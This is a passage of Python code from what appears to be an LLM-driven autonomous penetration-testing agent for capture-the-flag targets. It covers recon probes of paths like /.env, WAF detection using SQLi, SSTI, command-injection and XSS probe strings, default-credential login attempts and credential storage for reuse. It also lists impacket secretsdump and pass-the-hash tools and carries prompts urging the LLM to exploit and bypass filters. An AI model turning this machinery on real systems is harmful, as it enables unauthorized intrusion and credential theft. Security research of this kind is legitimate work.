            "/api/", "/.env", "/config.php",
        ]
        async def _probe_cms(endpoint: dict):
            url = endpoint.get("url", "")
            if not url or not url.startswith("http"):
                return
            base = url.rstrip("/")
            for path in _CMS_PATHS:
                try:
                    r = await self.recon_gateway.call("curl_get",
                        {"url": f"{base}{path}", "follow_redirects": True, "insecure": True})
                    if r.success:
                        out = getattr(r, "stdout", "")
                        st = 200
                        fl = out.split("\n")[0] if out else ""
                        if fl.startswith("HTTP/"):
                            pts = fl.split()
                            if len(pts) >= 2 and pts[1].isdigit():
                                st = int(pts[1])
                        # Only register CMS endpoints that return actual content
                        # (2xx/3xx) or auth-required responses (401/403).
                        # Exclude 400, 404, 405, 5xx — these are error pages, not
                        # real CMS endpoints (e.g. ingress-nginx returns 400 for
                        # unrecognized paths, which looks like a hit but isn't).
                        _is_content = 200 <= st < 400
                        _is_auth_wall = st in (401, 403)
                        if (_is_content or _is_auth_wall) and len(out) > 50:
                            self.dkg.add_node("Endpoint", f"ep-cms-{path.replace('/','-')[:30]}", {
                                "url": f"{base}{path}", "method": "GET", "params": "",
                                "sample_status": st, "sample_response": out[:2000],
                                "response_size": len(out),
                                "discovered_by": "cms-probe",
                            })
                except Exception:
                    pass

        # Run deep recon in parallel across endpoints (max 6 concurrent)
        batch = [ep for ep in endpoints[:8] if ep.get("url","").startswith("http")]
        if batch:
            tasks = [asyncio.create_task(_probe_one(ep)) for ep in batch]
            tasks += [asyncio.create_task(_probe_cms(ep)) for ep in batch]
            await asyncio.gather(*tasks, return_exceptions=True)
        log.info("_deep_recon: complete")

        # ── Deep recon summary ──────────────────────────────────────
        endpoints = self.dkg.query_nodes("Endpoint")
        vulns = self.dkg.query_nodes("Vulnerability")
        dirb_endpoints = [e for e in endpoints if "dirb" in str(e.get("discovered_by", ""))]
        nikto_vulns = [v for v in vulns if "nikto" in str(v.get("source", ""))]
        forms = [e for e in endpoints if e.get("params") and len(str(e.get("params", ""))) > 5]
        print(f"[DEEP RECON] {len(endpoints)} total endpoints")
        if dirb_endpoints:
            print(f"  dirb paths discovered: {len(dirb_endpoints)}")
        if nikto_vulns:
            print(f"  nikto findings: {len(nikto_vulns)}")
        if forms:
            print(f"  forms with parameters: {len(forms)}")
            for f in forms[:4]:
                pstr = str(f.get("params", ""))[:80]
                print(f"    {f.get('url','?')[:60]} params={pstr}")
            if len(forms) > 4:
                print(f"    ... and {len(forms) - 4} more forms")

    async def _detect_defenses(self) -> None:
        """Run DPM defense probes on discovered endpoints and update defense_state.

        Sends filter probes (classes A-E) to up to 6 GET endpoints with params,
        then runs the rule-based DPM detection pipeline (no LLM cost).
        """
        endpoints = self.dkg.query_nodes("Endpoint")
        get_endpoints = [
            e for e in endpoints
            if e.get("url", "").startswith("http") and e.get("method", "GET") == "GET"
            and e.get("params")  # prefer endpoints with parameters
        ][:6]
        if len(get_endpoints) < 3:
            # Fall back to any GET endpoints
            get_endpoints = [
                e for e in endpoints
                if e.get("url", "").startswith("http") and e.get("method", "GET") == "GET"
            ][:6]
        if not get_endpoints:
            print("[DEFENSE] No HTTP endpoints to probe — skipping defense detection "
                  f"({len(endpoints)} non-HTTP endpoints)")
            return

        all_probe_results = []
        all_responses = []
        for ep in get_endpoints:
            url = ep["url"]
            param = (ep.get("params") or ["q"])[0] if ep.get("params") else "q"
            try:
                probe_results = await self.probe_client.send_all_probe_classes(url, param)
                all_probe_results.extend(probe_results)
                all_responses.extend(
                    p.response for p in probe_results if hasattr(p, "response")
                )
            except Exception:
                continue

        if all_probe_results:
            self.defense_state = self.dpm.detect(
                all_probe_results, all_responses, use_llm=False,
            )
            self._task_log_event("info", "defense_detected",
                waf_type=self.defense_state.waf_type,
                defense_category=self.defense_state.defense_category,
                defense_complexity=self.defense_state.defense_complexity,
            )

        # ── Defense summary ─────────────────────────────────────────
        ds = self.defense_state
        if ds.waf_type and ds.waf_type != "unknown":
            print(f"\n[DEFENSE] WAF: {ds.waf_type} | "
                  f"Category: {ds.defense_category} | "
                  f"Complexity: {ds.defense_complexity:.2f}")
        else:
            print(f"\n[DEFENSE] No active WAF detected (complexity: {ds.defense_complexity:.2f})")
        if ds.honeypot_count > 0:
            print(f"  Honeypots detected: {ds.honeypot_count}")
        if ds.cloak_detected:
            print(f"  Cloaking detected: True")

    async def _verify_flag(
        self, flag: str, stdout: str, tc_args: dict, elapsed_ms: int = 0,
        tool_name: str = "",
    ) -> tuple[bool, str]:
        """Verify a flag with full DAVE L1+L4 when HTTP data is available.

        Falls back to verify_basic for non-HTTP tools (sqlmap, ffuf, etc.).
        """
        # Reject flags from local filesystem accesses — "shell_exec find /" or
        # "curl_get file://" searches the DARWIN host, not the target.
        # Flags must come from target interaction (remote host/port).
        if tool_name == "shell_exec":
            cmd = str(tc_args.get("command", "") or "")
            # Detect local filesystem search patterns
            _LOCAL_SEARCH_PATTERNS = [
                r'find\s+/', r'grep\s+-r.*flag', r'cat\s+/tmp/flag',
                r'cat\s+/var/.*flag', r'cat\s+/home/.*flag',
                r'ls\s+-la\s+/tmp/flag', r'locate\s+flag',
                r'strings\s+/', r'grep\s+-rn.*flag.*/(tmp|var|home|etc|root)',
            ]
            import re as _vre
            if any(_vre.search(p, cmd, _vre.IGNORECASE) for p in _LOCAL_SEARCH_PATTERNS):
                return False, f"local filesystem search — flag not from target: {flag[:40]}"
        if tool_name in ("curl_get", "http_post"):
            url = str(tc_args.get("url", "") or "")
            if url.startswith("file://"):
                return False, f"local file read via {tool_name} — flag not from target: {flag[:40]}"

        parsed = parse_tool_stdout(stdout)
        if parsed["status_code"] > 0:
            http_resp = HTTPResponse(
                url=str(tc_args.get("url", "")),
                status_code=parsed["status_code"],
                headers=parsed["headers"],
                body=parsed["body"],
                elapsed_ms=float(elapsed_ms),
            )
            attempt = ExploitAttempt(
                target_url=str(tc_args.get("url", "")),
                vuln_type=str(tc_args.get("tool", "")),
                payload=str(tc_args.get("payload", "")),
                http_response=http_resp,
                tool_stdout=stdout,
            )
            v_result = await self.dave.verify(attempt)
            if v_result.flag_value:
                return True, f"DAVE L1+L4: {v_result.flag_value}"
            return False, f"DAVE: {v_result.summary()}"
        return DAVE.verify_basic(flag, stdout)

    def _record_auth_protected_service(
        self, url: str, port: int, version: str, error: str
    ) -> None:
        """Record a service that requires authentication in DKG.

        Instead of silently skipping TLS/auth-protected services, create
        DKG nodes so the LLM can discover and attempt authentication during
        the analyze/plan phases.
        """
        host = url.replace("http://", "").replace("https://", "").split(":")[0]
        err_short = error[:120]

        # Record as a service that needs auth
        self.dkg.add_node("Service", f"svc-auth-{host}-{port}", {
            "port": port, "protocol": "tcp",
            "version": version or "unknown service",
            "banner": f"auth-protected: {err_short}",
            "needs_auth": True,
        })

        # Create an Endpoint placeholder so the LLM sees it
        ep_url = f"https://{host}:{port}" if port == 443 else f"https://{host}:{port}"
        self.dkg.add_node("Endpoint", f"endpoint-auth-{host}-{port}", {
            "url": ep_url, "method": "UNKNOWN",
            "params": "", "body_format": "",
            "auth_required": True,
            "auth_note": f"Connection failed: {err_short}. "
                        f"Use curl_get or http_post with appropriate auth headers "
                        f"(Bearer token, client cert, or Basic auth). "
                        f"If kubernetes, check ~/.kube/config or KUBECONFIG env var.",
        })

        log.info("Auth-protected service recorded: %s (port %d) — %s",
                 url, port, err_short[:80])

    # ── Login ─────────────────────────────────────────────────────
    async def _try_auto_login(
        self, target_url: str, username: str | None, password: str | None,
    ) -> None:
        """Try default credentials via the battle-tested auto_login.
        Only attempts ports that successfully responded to HTTP during recon.
        If this fails, the LLM in the solo cycle can use the try_login tool
        for more sophisticated attempts.
        """
        reachable = getattr(self, '_http_ports_reachable', set())
        for port in getattr(self, '_discovered_http_ports', []):
            if port not in reachable:
                continue  # skip ports that failed HTTP during recon
            host = getattr(self, "target_host", None)
            if not host:
                continue
            scheme = "https" if port == 443 else "http"
            base = f"{scheme}://{host}" if port in (80, 443) else f"{scheme}://{host}:{port}"
            # Only try the 2 most common credential pairs for speed
            for u, p in [("test", "test"), ("admin", "admin")]:
                if username and password:
                    u, p = username, password
                if self._time_exceeded():
                    return
                try:
                    if await self.client.auto_login(base, u, p):
                        log.info("Auto-login SUCCESS: %s:%d as %s/%s", host, port, u, p)
                        self._task_log_event("info", "auto_login_ok", url=base, username=u)
                        self.dkg.add_node("Credential", f"cred-{u}@{host}:{port}", {
                            "username": u, "password": p, "url": base,
                            "host": host, "port": port, "source": "auto_login",
                        })
                        # Persist to CTEG for cross-task reuse
                        try:
                            self.cteg.add_credential(
                                host=host, port=port, service_type="http",
                                username=u, password=p, source="auto_login",
                            )
                        except Exception:
                            pass
                        return
                    else:
                        log.info("Auto-login failed: %s:%d with %s/%s", host, port, u, p)
                except Exception as e:
                    log.warning("Auto-login error %s:%d: %s", host, port, e)
                # Only try one pair if specific credentials were provided
                if username:
                    break

    # ── Loop Termination ──────────────────────────────────────────

    def _should_terminate(self, result: TaskResult | None, max_loops: int) -> bool:
        """Check if the main loop should stop."""
        if result and result.success:
            # Chain mode: only stop if chain exhausted or safety cap reached
            if getattr(self, '_chain_mode', False):
                if getattr(self, '_chain_exhausted', False):
                    log.info("Chain mode: chain exhausted, terminating")
                    return True
                _max_flags = getattr(self, '_chain_max_flags', 10)
                if len(getattr(self, '_captured_flags', [])) >= _max_flags:
                    log.info("Chain mode: safety cap reached (%d flags), terminating", _max_flags)
                    return True
                # Otherwise continue — don't terminate on intermediate flag
            else:
                return True
        if self._time_exceeded() or self._tokens_exceeded():
            return True
        if self.phase in (OrchestratorPhase.DONE, OrchestratorPhase.FAILED):
            return True
        if self._loop_count >= max_loops:
            log.info("Max loops (%d) reached", max_loops)
            return True
        if getattr(self, '_solo_exhausted', False):
            # Solo exhausted — track no-progress stalls before terminating.
            if not getattr(self, '_chain_mode', False):
                _stalled = getattr(self, '_solo_exhausted_stall', 0) + 1
                self._solo_exhausted_stall = _stalled
                if _stalled >= 3:
                    log.info("Solo mode exhausted, no progress after %d loops — terminating", _stalled)
                    return True
        else:
            self._solo_exhausted_stall = 0
        # No-progress: consecutive outer loops with zero new discoveries
        if getattr(self, '_no_progress_loops', 0) >= 2:
            log.info("No progress for %d consecutive loops — terminating", self._no_progress_loops)
            return True
        return False

    # ── Chain Topology Detection ──────────────────────────────────

    def _detect_chain_topology(self, chain_mode_config: str = "auto") -> bool:
        """Detect if the target has multi-step attack chain topology.

        Activates chain_mode when: >= 2 distinct services each have
        associated vulnerability hypotheses, or >= 3 services total,
        indicating a multi-step chain target.

        Args:
            chain_mode_config: "auto" (detect), "off" (never activate)
        """
        if chain_mode_config == "off":
            return False

        if chain_mode_config != "auto":
            # Unknown value — don't activate
            return False

        services = self.dkg.query_nodes("Service")
        vulns = self.dkg.query_nodes("Vulnerability")

        # Count services that have vulnerability hypotheses
        services_with_vulns: set[str] = set()
        for v in vulns:
            svc = v.get("service") or v.get("port")
            if svc:
                services_with_vulns.add(str(svc))

        # Need >= 2 distinct services with vulns to qualify as chain
        if len(services_with_vulns) >= 2:
            self._chain_mode = True
            self._chain_services_total = len(services_with_vulns)
            return True

        # Also activate if >= 3 services total (potential chain, even w/o vulns yet)
        if len(services) >= 3:
            self._chain_mode = True
            self._chain_services_total = len(services)
            return True

        return False

    def _count_unexploited_services(self) -> int:
        """Count services that still have unexploited vulnerability hypotheses.

        A service is considered exploited if its associated vulnerability
        nodes are marked as exploited.
        """
        vulns = self.dkg.query_nodes("Vulnerability")
        exploited: set[str] = set()
        for v in vulns:
            if v.get("exploited") or v.get("status") == "exploited":
                svc = v.get("service") or v.get("port")
                if svc:
                    exploited.add(str(svc))

        services_with_vulns: set[str] = set()
        for v in vulns:
            svc = v.get("service") or v.get("port")
            if svc:
                services_with_vulns.add(str(svc))

        return len(services_with_vulns - exploited)

    # ── Unified State Access ──────────────────────────────────────

    def _get_state(self) -> PipelineState:
        """Return a typed snapshot of the current DKG state.

        All phases call this instead of raw dkg.query_nodes() + dict access.
        """
        return normalize_dkg_state(self.dkg)

    # ── Tool Result Feedback ─────────────────────────────────────

    EXPLOIT_TOOLS = {"sqlmap_test", "send_payload", "command_injection_test",
                     "xss_reflection_test", "ffuf_fuzz", "http_post",
                     "redis_cmd", "mysql_query", "psql_query", "mssql_query", "mssqlclient_query",
                     "oracle_query", "tomcat_exploit", "php_filter_chain",
                     "jwt_forge", "impacket_psexec", "impacket_wmiexec",
                     "impacket_pth", "impacket_ticketer", "impacket_silver_ticket",
                     "impacket_secretsdump", "impacket_secretsdump_dcsync",
                     "impacket_GetUserSPNs", "impacket_GetNPUsers", "wpscan_enum"}

    @staticmethod
    def _format_parse_summary(parsed: dict) -> str:
        """Convert parse_response output to a compact (<800 char) string."""
        lines = []
        ct = parsed.get("type", "?")
        size = parsed.get("size_bytes", 0)
        if size > 1048576:
            size_str = f"{size / 1048576:.1f}MB"
        elif size > 1024:
            size_str = f"{size / 1024:.1f}KB"
        else:
            size_str = f"{size}B"
        lines.append(f"Type={ct}, Size={size_str}")

        flags = parsed.get("flags", [])
        if flags:
            lines.append(f"FLAGS={flags}")

        if ct == "html":
            if parsed.get("title"):
                lines.append(f"Title: {parsed['title'][:80]}")
            lines.append(f"Forms={parsed.get('forms',0)} Inputs={parsed.get('inputs',0)} Links={parsed.get('links_count',0)}")
            apis = parsed.get("api_paths", [])
            if apis:
                lines.append(f"API: {' '.join(apis[:8])[:180]}")
            eps = parsed.get("endpoints", [])
            if eps:
                lines.append(f"EP: {' '.join(eps[:10])[:200]}")
            sc = parsed.get("scripts", [])
            if sc:
                lines.append(f"JS: {' '.join(sc[:5])[:150]}")
        elif ct == "json":
            tlk = parsed.get("top_level_keys")
            if tlk:
                lines.append(f"Keys: {tlk}")
            iv = parsed.get("interesting_values", [])
            for item in iv[:5]:
                lines.append(f"  [{item['path']}]: {item['value'][:80]}")
        elif ct == "text":
            urls = parsed.get("urls", [])
            if urls:
                lines.append(f"URLs: {' '.join(urls[:6])}")
            jwts = parsed.get("jwt_tokens", [])
            if jwts:
                lines.append(f"JWT: {jwts[:3]}")

        result = "\n".join(lines)
        return result[:800]

    def _format_tool_feedback(
        self, tc_name: str, tc_args: dict, result, defence_probe: str = ""
    ) -> str:
        """Format a tool execution result into structured feedback for the LLM.

        Gives the LLM clear status, stdout, stderr, and defense probe findings.
        """
        status = "SUCCESS" if (hasattr(result, 'success') and result.success) else "FAILED"
        exit_code = getattr(result, 'exit_code', '?')
        stdout = getattr(result, 'stdout', '') or ''
        stderr = getattr(result, 'stderr', '') or ''
        elapsed = getattr(result, 'elapsed_ms', 0)

        # Detect timeout (empty output + failure)
        if status == "FAILED" and not stdout and not stderr:
            status = "TIMEOUT"

        parts = [
            f"[TOOL: {tc_name}]",
            f"STATUS: {status} (exit={exit_code}, {elapsed}ms)",
            f"ARGS: {json.dumps(tc_args, default=str)[:200]}",
        ]
        if stdout:
            # Info-gathering tools need more room — wpscan plugin lists,
            # nmap results, and RAG knowledge often exceed 1500 chars.
            _INFO_TOOLS = {"wpscan_enum", "knowledge_search", "nmap_port_range",
                           "nmap_full_scan", "nikto_scan", "dirb_scan",
                           "gobuster_dir", "nvd_search_cves", "searchsploit_search",
                           "metasploit_search", "go_exploitdb_search"}
            _stdout_limit = 5000 if tc_name in _INFO_TOOLS else 1500
            parts.append(f"STDOUT: {stdout[:_stdout_limit]}")
        if stderr:
            parts.append(f"STDERR: {stderr[:500]}")
        if not stdout and not stderr:
            parts.append("(no output)")
        if defence_probe:
            parts.append(defence_probe)

        # Auto-parse: for large or structured responses, append a compact summary.
        # curl_get / http_post responses > 5000 bytes often contain HTML or JSON
        # that gets truncated at 1500 chars — parse_response extracts the structure.
        _PARSABLE_TOOLS = {"curl_get", "http_post"}
        if (stdout and tc_name in _PARSABLE_TOOLS and len(stdout) > 5000
                and status == "SUCCESS"):
            try:
                content_type = "auto"
                # If the response includes HTTP headers, try Content-Type hint
                if stdout.startswith("HTTP/"):
                    ct_match = re.search(r'Content-Type:\s*(\S+)', stdout, re.I)
                    if ct_match:
                        ct_val = ct_match.group(1).lower()
                        if "html" in ct_val:
                            content_type = "html"
                        elif "json" in ct_val:
                            content_type = "json"
                parsed = parse_response(stdout, content_type=content_type)
                summary = self._format_parse_summary(parsed)
                if summary:
                    parts.append(f"PARSED SUMMARY:\n{summary}")
            except Exception:
                pass  # best-effort, never break feedback

        return "\n".join(parts)

    # Per-vuln-type probe payloads for defense detection
    _PROBE_PAYLOADS = {
        "sqlmap_test":           ("' OR '1'='1", "SQLi"),
        "send_payload":          ("{{7*7}}", "injection"),
        "command_injection_test": ("; id", "CMDi"),
        "xss_reflection_test":   ("<script>alert(1)</script>", "XSS"),
        "ffuf_fuzz":             ("' OR '1'='1", "SQLi"),
    }

    async def _probe_for_defense(
        self, url: str, param: str, method: str = "GET", tool_name: str = ""
    ) -> str:
        """Run light probes on an endpoint to detect app-level filtering.

        Selects the right probe payload based on the exploit tool that was used.
        For POST/JSON endpoints, sends a proper POST with JSON body.
        Returns a formatted string describing any defense found, or empty string.
        """
        try:
            import urllib.request as _ur, json as _json
            probe_val, probe_type = self._PROBE_PAYLOADS.get(
                tool_name, ("' OR '1'='1", "injection"))

            if method.upper() == "POST":
                baseline_data = _json.dumps({param: "normal"}).encode()
                probe_data = _json.dumps({param: probe_val}).encode()
                hdrs = {"Content-Type": "application/json", "User-Agent": "DARWIN/0.1"}

                req0 = _ur.Request(url, data=baseline_data, headers=hdrs, method="POST")
                try:
                    with _ur.urlopen(req0, timeout=8) as r0:
                        b_body = r0.read().decode(errors="replace")
                        b_status = r0.status
                except Exception:
                    return ""

                req1 = _ur.Request(url, data=probe_data, headers=hdrs, method="POST")
                try:
                    with _ur.urlopen(req1, timeout=8) as r1:
                        p_body = r1.read().decode(errors="replace")
                        p_status = r1.status
                except Exception as e:
                    p_body = str(e)
                    p_status = getattr(e, 'code', 0)

                b_len, p_len = len(b_body), len(p_body)
                reflected = probe_val in p_body

                if p_status >= 500 and b_status < 400:
                    # 500 with injection probe = backend is processing input.
                    # For SSTI this is actually positive signal (template engine
                    # tried to render {{7*7}} and crashed).
                    return (
                        f"\n[DEFENSE PROBE — {probe_type}] "
                        f"Probe caused HTTP {p_status} (baseline {b_status}). "
                        f"Backend IS processing the input — crash/difference confirms "
                        f"the parameter reaches server-side logic. "
                        f"Try: different payload syntax or encodings."
                    )
                elif p_status in (403, 406, 429):
                    return (
                        f"\n[DEFENSE PROBE — {probe_type}] "
                        f"Probe blocked with HTTP {p_status}. "
                        f"WAF or rate limiter active. "
                        f"Try: parameter pollution, encoding, content-type switch."
                    )
                elif not reflected and p_len < b_len * 0.9:
                    return (
                        f"\n[DEFENSE PROBE — {probe_type}] "
                        f"Body shrunk ({p_len}/{b_len}B = {p_len/max(b_len,1):.0%}). "
                        f"Keyword likely silently removed. "
                        f"Try bypass: double-write, case variation."
                    )
            else:
                # GET endpoint — use ProbeClient
                baseline = await self.probe_client.get_baseline(url)
                pr = await self.probe_client.send_probe(url, param, probe_val)
                if baseline:
                    b_len = len(baseline.body)
                    p_len = len(pr.response.body) if hasattr(pr, 'response') else 0
                    reflected = probe_val in (pr.response.body if hasattr(pr, 'response') else '')
                    if pr.blocked:
                        return (
                            f"\n[DEFENSE PROBE — {probe_type}] "
                            f"Probe BLOCKED. WAF or filter active."
                        )
                    elif not reflected and p_len < b_len * 0.9:
                        return (
                            f"\n[DEFENSE PROBE — {probe_type}] "
                            f"Body shrunk ({p_len}/{b_len}B). Keyword likely removed. "
                            f"Try bypass techniques."
                        )
        except Exception:
            pass
        return ""

    # ── Unified LLM-Driven Loop (v2: LLM drives EVERYTHING) ──────────

    async def _unified_llm_loop(
        self, target_url: str, cteg_hints: dict | None = None
    ) -> TaskResult | None:
        """Unified LLM loop: from bootstrap onward, the LLM drives all actions.

        No separate recon/analyze/systematic phases. The LLM receives bootstrap
        nmap results + all tools, then plans and executes everything: HTTP probe,
        fingerprint, enumerate, authenticate, data discovery, exploit.

        Plan → execute → observe → replan, all in one loop.
        """
        MAX_ITER = 25
        self._plan_review_exhausted = False  # reset for each entry
        if not self._solo_cycle_context_injected:
            self.llm.replace_system_prompt(SYSTEM_PROMPT_ORCHESTRATOR_UNIFIED)
            self._solo_cycle_context_injected = True
        else:
            self._maybe_compress()
            cycle_summary = self._build_cycle_summary()
            self.llm.add_context_message(cycle_summary.to_prompt_block(), role="user")

        if not hasattr(self, '_exploit_chain'):
            self._exploit_chain: list[dict] = []

        # Generate initial plan (or regenerate when all tasks are resolved)
        _needs_regenerate = (
            not self.exploitation_plan
            or not self.exploitation_plan.tasks
            or all(
                t.get("status") in ("done", "failed", "skipped", "exhausted")
                for t in self.exploitation_plan.tasks
                if isinstance(t, dict)
            )
        )
        if _needs_regenerate:
            self.exploitation_plan = await self._generate_exploitation_plan(target_url, cteg_hints)

            # ── Phase log: plan ──
            if self.phase_logger and self.exploitation_plan:
                _plan = self.exploitation_plan
                _plan_text = f"Plan {_plan.plan_id}: {_plan.goal}\n"
                for t in _plan.tasks[:30]:
                    _plan_text += f"  [{t.get('status','?')}] {t.get('instruction','')[:120]}\n"
                if len(_plan.tasks) > 30:
                    _plan_text += f"  ... and {len(_plan.tasks) - 30} more tasks\n"
                self.phase_logger.log_phase("plan", _plan_text,
                    metadata={"task_count": len(_plan.tasks), "plan_id": _plan.plan_id})

            # ── Trace: plan generation event ──
            self._task_log_event(
                "info", "plan_generated",
                plan_id=self.exploitation_plan.plan_id,
                task_count=len(self.exploitation_plan.tasks),
                goal=self.exploitation_plan.goal[:160],
            )

        # Plan already generated before systematic exploit — skip duplicate

        # Build tool definitions from recon + attack gateways + MCP servers
        # Filter blacklisted tools so the LLM never sees them as callable functions.
        tool_defs = [
            d for d in self.attack_gateway.get_tool_definitions()
            if d.get("function", {}).get("name") not in self._BLACKLISTED_TOOLS
        ]
        tool_defs += [
            d for d in self.recon_gateway.get_tool_definitions()
            if d.get("function", {}).get("name") not in self._BLACKLISTED_TOOLS
        ]
        try:
            mcp_defs = self.mcp_pool.get_tool_definitions()
            if mcp_defs:
                tool_defs += mcp_defs
        except Exception:
            pass

        # Check if we have active session cookies from auto_login
        session_cookies = ""
        if self.client._session and self.client._session.cookie_jar:
            jar_cookies = list(self.client._session.cookie_jar)
            if jar_cookies:
                cookie_str = "; ".join(
                    f"{ck.key}={ck.value}" for ck in jar_cookies
                )
                session_cookies = (
                    f"\n## ACTIVE SESSION — YOU ARE LOGGED IN\n"
                    f"Session cookie: {cookie_str[:200]}\n"
                    f"Use the 'cookie' parameter on EVERY curl_get and http_post call:\n"
                    f'  curl_get(url="http://localhost:8000/admin", cookie="{cookie_str[:150]}")\n'
                    f'  curl_get(url="http://localhost:8000/dashboard?id=2", cookie="{cookie_str[:150]}")\n'
                    f"FIRST: try /admin, /dashboard, /profile, /config with the cookie.\n"
                    f"THEN: try IDOR — same cookie, different IDs in URL paths.\n"
                )

        # Build context from typed PipelineState
        state = self._get_state()

        api_endpoints_text = ""
        post_eps = [ep for ep in state.endpoints if ep.method == "POST"]
        if post_eps:
            api_endpoints_text = "\n## API Endpoints (from OpenAPI spec):\n"
            for ep in post_eps[:10]:
                params_str = ", ".join(ep.params)
                bf_hint = f" body_format={ep.body_format}" if ep.body_format else ""
                api_endpoints_text += (
                    f"  POST {ep.url} [params: {params_str}{bf_hint}]\n"
                )

        endpoints_text = "\n".join(
            f"- {ep.url} [{ep.method}]"
            + (f" params={', '.join(ep.params)}" if ep.params else "")
            + (f" body_format={ep.body_format}" if ep.body_format else "")
            for ep in state.endpoints[:12]
        )
        services_text = "\n".join(
            f"- port {s.port}/{s.protocol}: {s.version or s.banner}"
            for s in state.services[:10]
            if s.port
        )

        # Use CTEG hints passed from run() (dynamic patterns from prior tasks)
        cteg_text = ""
        if cteg_hints:
            parts = []
            for es in cteg_hints.get("exploit_strategies", []):
                parts.append(f"Learned: {es.get('description','')}")
                for t in es.get("techniques", []):
                    parts.append(f"  → {t}")
            for bs in cteg_hints.get("bypass_strategies", []):
                parts.append(f"Bypass: {bs.get('mechanism','')} — {bs.get('description','')}")
            # Inject known credentials from CTEG
            _known_creds = cteg_hints.get("known_credentials", [])
            if _known_creds:
                parts.append("Known credentials (from prior runs — try these FIRST):")
                for _kc in _known_creds:
                    parts.append(f"  → {_kc}")
            if parts:
                cteg_text = "\n## Prior Experience (CTEG):\n" + "\n".join(parts) + "\n"

        vuln_text = ""
        if self.vulnerabilities:
            vuln_parts = ["\n## Vulnerability Hypotheses (from analysis):\n"]
            for i, v in enumerate(self.vulnerabilities):
                vuln_parts.append(f"  {i+1}. [{v.vuln_type}] {v.endpoint}")
                if v.param:
                    vuln_parts[-1] += f" param={v.param}"
                vuln_parts[-1] += f" confidence={v.confidence:.2f}"
                if v.evidence:
                    vuln_parts.append(f"     Evidence: {v.evidence[:150]}")
                if v.suggested_tool:
                    tool_line = f"     Suggested tool: {v.suggested_tool}"
                    if v.tool_args:
                        tool_line += f" with args: {json.dumps(v.tool_args)[:150]}"
                    vuln_parts.append(tool_line)
            vuln_parts.append("\n## Execute the suggested tools for each vulnerability above.\n")
            vuln_text = "\n".join(vuln_parts)

        plan_status = self._format_plan_status() if self.exploitation_plan else ""

        # Build data-driven guidance (replaces static checklist)
        endpoints = self.dkg.query_nodes("Endpoint")
        params_list = [e.get("url","") for e in endpoints if e.get("params")]
        post_list = [f"{e.get('url','')} (body_format={e.get('body_format','form')})"
                     for e in endpoints if e.get("method","GET") == "POST"]
        param_endpoints = ", ".join(params_list[:5]) if params_list else "none"
        post_endpoints = ", ".join(post_list[:5]) if post_list else "none"
        # Collect tested combos from systematic pass for the "already tested" hint
        systematic_tested = "none"
        sys_vulns = self.dkg.query_nodes("Vulnerability")
        sys_tested = [v for v in sys_vulns if v.get("tested_at")]
        if sys_tested:
            systematic_tested = "; ".join(
                f"{v.get('test_tool','tool')} on {v.get('endpoint','')}"
                for v in sys_tested[:5]
            )

        initial_prompt = f"""Target: {target_url}

## Discovered Services
{services_text}

## Discovered Endpoints
{endpoints_text}
{api_endpoints_text}
{session_cookies}
{cteg_text}

## Guidance:
- Endpoints with params: {param_endpoints}
- POST endpoints: {post_endpoints}
- Auto-login tried: test/test (failed), admin/admin (failed)
- Already tested: {systematic_tested}
- For POST endpoints, check body_format before choosing content_type
- Use knowledge_search for technique guidance; if results are poor, use an available web search tool for current info

{plan_status}
{vuln_text}
"""

        # Inject initial context into LLM conversation (no tool calling yet).
        # The plan-driven loop below will start task execution.
        self.llm.add_context_message(initial_prompt, role="user")

        print(f"\n[solo] Starting plan-driven loop: "
              f"{len(self.exploitation_plan.tasks) if self.exploitation_plan else 0} tasks, "
              f"token_count={self.llm.token_count}")

        # ── Systematic exploit pass (pre-plan, no LLM cost) ──
        systematic_result = await self._systematic_exploit_pass(target_url)

        # ── Phase log: systematic exploit ──
        if self.phase_logger:
            _vulns_tested = sum(
                1 for v in self.dkg.query_nodes("Vulnerability")
                if v.get("tested_at")
            )
            _vulns_total = len(self.dkg.query_nodes("Vulnerability"))
            self.phase_logger.log_phase("systematic_exploit",
                f"[systematic] Tested {_vulns_tested}/{_vulns_total} vulnerabilities",
                metadata={"vulns_tested": _vulns_tested,
                          "vulns_total": _vulns_total,
                          "flag_found": bool(systematic_result and systematic_result.success)})

        if systematic_result and systematic_result.success:
            return systematic_result

        # ── Inject intermediate artifacts from systematic pass ──
        _sys_artifacts = self._extract_recent_artifacts()
        if _sys_artifacts:
            self.llm.add_context_message(_sys_artifacts, role="user")

        # ── Plan-driven execution loop (VulnBot-style, dynamic) ──
        # LLM generated a plan. Execute tasks one by one.
        # After EACH task: LLM reviews and updates the plan.
        # When plan is exhausted: LLM can add more tasks or enter free-form.
        for iteration in range(1, MAX_ITER + 1):
            if self._time_exceeded() or self._tokens_exceeded():
                break

            task = self._select_next_plan_task()
            if not task:
                # Plan exhausted — ask LLM if it wants to add more tasks
                if not getattr(self, '_plan_review_exhausted', False):
                    self._plan_review_exhausted = True
                    state = self._get_state()
                    plan = self.exploitation_plan
                    n_tasks = len(plan.tasks) if plan else 0
                    n_endpoints = len(state.endpoints)
                    n_services = len(state.services)
                    n_done = sum(1 for t in (plan.tasks or []) if t.get("status") == "done")

                    ep_list = [f"{ep.method} {ep.url}" for ep in state.endpoints[-10:]]
                    svc_list = [f"{s.port}/{s.protocol} {s.version or s.banner}"
                               for s in state.services[-5:] if s.port]

                    # Thin-plan detection: too few tasks given the attack surface.
                    # Also fires for non-HTTP targets (0 endpoints, ≥1 service).
                    thin_warning = ""
                    if n_tasks <= 3 and n_done <= 4 and (n_endpoints >= 3 or n_services >= 1):
                        thin_warning = (
                            f"\nWARNING: Only {n_tasks} tasks ({n_done} done) for "
                            f"{n_endpoints} endpoints + {n_services} services. "
                            f"The plan was too thin. "
                            f"\nSTEP 1 — ENUMERATE: You have dirb_scan and gobuster_dir — "
                            f"USE THEM on every HTTP endpoint to discover hidden paths. "
                            f"Also curl_get common paths: /api, /admin, /login, /config, "
                            f"/.env, /backup, /robots.txt, /.git/HEAD, plus any "
                            f"framework-specific paths for the detected technology stack. "
                            f"A simple index page often hides complex apps behind other paths."
                            f"\nSTEP 2 — EXPLOIT: After enumeration, based on what you "
                            f"DISCOVERED, add exploitation tasks. Look at EVERY endpoint: "
                            f"could it be vulnerable to SQLi, LFI, command injection, SSTI, "
                            f"auth bypass, XXE, SSRF, file upload, or credential stuffing? "
                            f"Aim for 8-15 tasks covering multiple attack vectors.\n"
                            f"IMPORTANT: Prioritize the ORIGINAL vulnerability type "
                            f"detected during analysis. If the primary vulnerability "
                            f"has not been fully exploited, try MANY variations "
                            f"(different credentials, parameters, payloads) before "
                            f"moving on to unrelated endpoints. Exhaust the primary "
                            f"target first — don't abandon it for newly discovered ports.\n"
                        )

